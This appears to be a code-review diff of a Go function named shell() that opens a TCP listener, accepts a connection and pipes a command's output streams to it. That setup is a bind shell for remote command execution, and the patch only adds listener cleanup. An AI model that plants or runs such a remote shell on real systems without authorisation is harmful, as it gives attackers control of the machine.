@@ -45,12 +45,14 @@ func shell() {
 	list, err := net.Listen("tcp", host+":"+port)
 	if err != nil {
 		fmt.Println(err.Error())
+		list.Close()
 		reset()
 		return
 	}
 	con, err := list.Accept()
 	if err != nil {
 		fmt.Println(err.Error())
+		list.Close()
 		con.Close()
 		reset()
 		return
@@ -62,6 +64,7 @@ func shell() {
 	cmd.Stdout = con
 	cmd.Stderr = con
 	cmd.Run()
+	list.Close()
 	con.Close()
 	reset()
 }
